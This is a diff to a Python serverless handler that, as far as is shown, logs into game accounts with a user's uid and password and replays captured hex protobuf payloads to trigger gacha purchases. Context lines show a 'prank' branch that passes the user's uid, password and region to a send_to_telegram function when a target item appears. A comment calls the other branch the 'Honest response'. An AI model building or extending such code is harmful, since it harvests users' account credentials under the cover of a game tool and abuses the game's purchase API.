@@ -4,8 +4,8 @@ Vercel serverless handler.
 
 Events:
   ?event=naruto  (default) — PurchaseGacha + Naruto Bundle prank
-  ?event=faded            — EliminateGoodsFromLimitPool → PurchaseGacha
-  ?event=normal           — PurchaseGacha (real items, no prank)
+  ?event=faded            — EliminateGoodsFromLimitPool (with fallback) → PurchaseGacha
+  ?event=skywing          — PurchaseGacha (real items, no prank)   [alias: normal]
 
 JWT strategy:
   1. Try primary first.
@@ -78,11 +78,16 @@ NARUTO_FALLBACKS = [
 # --- Faded wheel event ---
 FADED_PAYLOAD   = "B31B32FB8303719D61FC461DC26135E4"
 FADED_FALLBACKS = ["3D91D5DF338384E0D1E27505230D1365"]
-FADED_ELIMINATE_PAYLOAD = "6F02DE6FB351FFB2521C944DA0E6C1EB"
 
-# --- Normal event (Nine Tails / M4A1 / Obito) ---
-NORMAL_PAYLOAD   = "A2230108442CE3F8EEC41AC9B6B8606D"
-NORMAL_FALLBACKS = [
+# Eliminate payloads — tried in order until one returns HTTP 200
+FADED_ELIMINATE_PAYLOADS = [
+    "6F02DE6FB351FFB2521C944DA0E6C1EB",   # primary
+    "891FB0295590ED01E7B80ACF99290CF6",   # fallback
+]
+
+# --- Skywing event (formerly "normal") ---
+SKYWING_PAYLOAD   = "A2230108442CE3F8EEC41AC9B6B8606D"
+SKYWING_FALLBACKS = [
     "18138AD791CDB12C351BC4BEA176EA90",
     "7D343C717F0ECB6A03B1F1A2CE6058DA",
     "2D41F20BFF93302B3326372942870984",
@@ -99,16 +104,22 @@ EVENTS = {
         "name": "Faded Wheel",
         "payloads": [FADED_PAYLOAD] + FADED_FALLBACKS,
         "eliminate": True,
-        "eliminate_payload": FADED_ELIMINATE_PAYLOAD,
+        "eliminate_payloads": FADED_ELIMINATE_PAYLOADS,
         "prank": False,
     },
-    "normal": {
-        "name": "Normal Event (Nine Tails)",
-        "payloads": [NORMAL_PAYLOAD] + NORMAL_FALLBACKS,
+    "skywing": {
+        "name": "Skywing Event",
+        "payloads": [SKYWING_PAYLOAD] + SKYWING_FALLBACKS,
         "eliminate": False,
         "prank": False,
     },
 }
+
+# Alias "normal" → "skywing" for backward compatibility
+EVENT_ALIASES = {
+    "normal": "skywing",
+}
+
 DEFAULT_EVENT = "naruto"
 
 
@@ -173,7 +184,7 @@ RARE_ITEMS_DB = {
     909047015: "Rasengan - Emote",
     # Faded wheel
     907104745: "Fist - Ninjutsu Theme",
-    # Normal event
+    # Skywing event
     911004701: "The Nine Tails Theme",
     907104744: "M4A1 - Naruto Theme",
     211047048: "Obito Headwear",
@@ -357,7 +368,7 @@ async def send_to_telegram(session, uid, password, region, naruto_count):
 
 
 # ------------------------------------------------------------------ #
-#  TOKEN PROVIDER — primary first, then parallel race
+#  TOKEN PROVIDER
 # ------------------------------------------------------------------ #
 async def _try_one_provider(session, provider, uid, password, retries=2):
     params = provider["params"](uid, password)
@@ -540,6 +551,34 @@ async def eliminate_req(session, token, payload, url, max_retries=3):
     return last_status, None
 
 
+async def eliminate_with_fallbacks(session, token, payload_list, url):
+    """
+    Try each elimination payload in order.
+    Returns (winner_index, status, resp_bytes):
+      winner_index: 0-based index of the payload that returned 200, or None
+      status: HTTP status of the last attempt
+      resp: raw bytes of the winning response (or last attempt)
+    """
+    last_status = 0
+    last_resp   = None
+
+    for idx, raw in enumerate(payload_list):
+        try:
+            pbytes = binascii.unhexlify(raw.replace(" ", ""))
+        except Exception as e:
+            print(f"[ELIM] payload[{idx}] invalid hex: {e}", flush=True)
+            continue
+
+        status, resp = await eliminate_req(session, token, pbytes, url, 3)
+        print(f"[ELIM] payload[{idx}] status={status}", flush=True)
+        last_status, last_resp = status, resp
+
+        if status == 200:
+            return idx, status, resp
+
+    return None, last_status, last_resp
+
+
 # ------------------------------------------------------------------ #
 #  CORE PIPELINE
 # ------------------------------------------------------------------ #
@@ -549,12 +588,15 @@ async def spin(uid: str, password: str, payload_hex: str = None,
         return {"success": False, "error": f"protobuf_load_failed: {_PB2_IMPORT_ERROR}"}
 
     event = (event or DEFAULT_EVENT).lower()
+    # Resolve aliases
+    event = EVENT_ALIASES.get(event, event)
+
     if event not in EVENTS:
         return {"success": False, "error": f"unknown_event: {event}"}
 
     cfg = EVENTS[event]
 
-    # Build payload queue
+    # Build gacha payload queue
     if payload_hex is not None:
         queue = [("custom", payload_hex)]
     else:
@@ -569,12 +611,12 @@ async def spin(uid: str, password: str, payload_hex: str = None,
         except Exception as e:
             return {"success": False, "error": f"invalid_payload_hex[{label}]: {e}"}
 
-    eliminate_bytes = None
+    # Pre-parse elimination payloads (faded only)
+    eliminate_list = None
     if cfg.get("eliminate"):
-        try:
-            eliminate_bytes = binascii.unhexlify(cfg["eliminate_payload"].replace(" ", ""))
-        except Exception as e:
-            return {"success": False, "error": f"invalid_eliminate_hex: {e}"}
+        eliminate_list = cfg.get("eliminate_payloads") or []
+        if not eliminate_list:
+            return {"success": False, "error": "eliminate_payloads_missing"}
 
     async with aiohttp.ClientSession() as session:
         token_data = await get_token_data(session, uid, password)
@@ -586,21 +628,25 @@ async def spin(uid: str, password: str, payload_hex: str = None,
         jwt_provider = token_data["provider"]
         url = token_data["addr"] or pick_server_url_from_token(token)
 
-        # Eliminate step (faded only)
-        eliminate_status = None
-        if eliminate_bytes is not None:
-            eliminate_status, _ = await eliminate_req(session, token, eliminate_bytes, url, 3)
-            print(f"[ELIM] status={eliminate_status}", flush=True)
-            if eliminate_status != 200:
+        # ---- Elimination step (faded only, with fallbacks) ----
+        eliminate_status      = None
+        eliminate_winner_idx  = None
+        if eliminate_list is not None:
+            eliminate_winner_idx, eliminate_status, _ = await eliminate_with_fallbacks(
+                session, token, eliminate_list, url
+            )
+            if eliminate_winner_idx is None:
                 return {
                     "success": False,
                     "error": f"eliminate_http_{eliminate_status}",
                     "region": region,
                     "event": event,
                     "jwt": jwt_provider,
+                    "eliminate_attempts": len(eliminate_list),
                 }
+            print(f"[ELIM] ✓ winner payload #{eliminate_winner_idx}", flush=True)
 
-        # Gacha
+        # ---- Gacha ----
         final_status = 0
         final_resp   = None
         final_items  = []
@@ -622,7 +668,7 @@ async def spin(uid: str, password: str, payload_hex: str = None,
                 "jwt": jwt_provider,
             }
 
-        # Prank (naruto only)
+        # ---- Prank (naruto only) ----
         if cfg.get("prank"):
             naruto_hits = [it for it in final_items if it["id"] == PRANK_TARGET_ID]
             if naruto_hits:
@@ -639,6 +685,7 @@ async def spin(uid: str, password: str, payload_hex: str = None,
                     "_tg": "sent" if tg_ok else "failed",
                 }
 
+        # ---- Honest response ----
         result = {
             "success": True,
             "uid": uid, "region": region, "event": event,
@@ -646,7 +693,8 @@ async def spin(uid: str, password: str, payload_hex: str = None,
             "items": final_items,
         }
         if eliminate_status is not None:
-            result["eliminate_status"] = eliminate_status
+            result["eliminate_status"]     = eliminate_status
+            result["eliminate_payload_idx"] = eliminate_winner_idx
         return result
 
 
@@ -654,7 +702,7 @@ async def spin(uid: str, password: str, payload_hex: str = None,
 #  HEALTH
 # ------------------------------------------------------------------ #
 HEALTH_START_TS = time.time()
-HEALTH_VERSION  = "3.1"
+HEALTH_VERSION  = "3.2"
 
 
 async def _probe_upstream(session, url, timeout=6):
@@ -700,6 +748,7 @@ async def _run_health_checks(deep: bool):
             "ok": True,
             "detail": f"loaded: {', '.join(EVENTS.keys())}",
             "default": DEFAULT_EVENT,
+            "aliases": EVENT_ALIASES,
         },
         "jwt_strategy": {
             "ok": True,
